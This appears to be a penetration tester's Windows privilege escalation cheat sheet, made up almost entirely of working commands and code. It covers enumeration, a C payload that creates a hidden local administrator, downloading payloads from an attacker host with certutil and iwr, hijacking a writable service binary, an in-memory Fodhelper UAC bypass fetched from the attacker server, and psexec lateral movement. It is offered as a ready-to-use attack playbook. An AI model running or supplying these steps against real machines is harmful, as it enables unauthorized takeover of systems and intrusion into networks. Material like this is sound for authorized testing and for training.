---
title: Windows Privilege Escalation
type: note
tab: Privesc
inputs: [Shell]
outputs: [Admin, Services, Privileges]
tags: [Windows, PrivilegeEscalation]
---

# Windows Privilege Escalation

## Quick Checks

#Shell #Windows #PrivilegeEscalation
Quick Windows privesc checklist for user context, services, installer policy, and interesting software paths.

```powershell
# Current user, groups, and privileges.
whoami /all

# Check local administrators.
net localgroup administrators

# List services and look for unquoted paths.
wmic service get name,displayname,pathname,startmode
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"

# AlwaysInstallElevated registry keys.
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Installed software and common writable install paths.
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
dir C:\
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\ProgramData
```

## Writable Service / Binary Hijack

#Shell #Windows #PrivilegeEscalation
Check a writable service binary, replace it, reboot, and verify admin access.

1. Check whether the target binary is writable. `F` means full control.

```sh
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

2. Create `adduser.c` with this payload body on the attacker box.

```c
#include <stdlib.h>
int main() {
  system("net user <USER> <PASS> /add");
  system("net localgroup administrators <USER> /add");
  return 0;
}
```

3. Compile the payload.

```sh
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

4. Download the payload on the target.

```powershell
certutil.exe -urlcache -f http://<LHOST>/adduser.exe adduser.exe
iwr -Uri http://<LHOST>/adduser.exe -OutFile adduser.exe
```

5. Replace the writable binary and trigger reboot.

```cmd
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe.bak
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
shutdown /r /t 0
```

6. Verify the new admin user.

```cmd
net user
net localgroup administrators
```

## Add Local Admin User

#Shell #Windows #PrivilegeEscalation
Create a user and add it to local administrators.

```cmd
net user <USER> <PASS> /add
net localgroup administrators <USER> /add
```

## Audit Scripts

#Shell #Windows #PrivilegeEscalation
Run common Windows privesc PowerShell audit scripts.

```powershell
# PowerUp
certutil.exe -urlcache -f http://<LHOST>/PowerUp.ps1 PowerUp.ps1
powershell -ExecutionPolicy Bypass
. .\PowerUp.ps1
Invoke-PrivescAudit

# PrivescCheck
. .\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck --Extended
```

## Run As Another User

#Username #Password #Windows #PrivilegeEscalation
Run a process as another user if you know valid local or admin creds.

```cmd
runas.exe /user:<USER> cmd
```

## UAC Bypass

#Shell #Windows #PrivilegeEscalation
Run the Fodhelper UAC bypass from disk or directly from an attacker web server.

```powershell
# From disk.
powershell -ExecutionPolicy Bypass
. .\FodhelperBypass.ps1
FodhelperBypass -program "cmd.exe /c powershell.exe"

# In-memory from attacker host.
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/FodhelperBypass.ps1') | IEX
FodhelperBypass -program "cmd.exe /c powershell -e <BASE64_PAYLOAD>"
```

## Remote Execution After Admin

#Username #Password #SMB #Windows #Exploitation
Use psexec after obtaining local admin credentials.

```sh
impacket-psexec '<USER>:<PASS>'@<TARGET_IP>
```
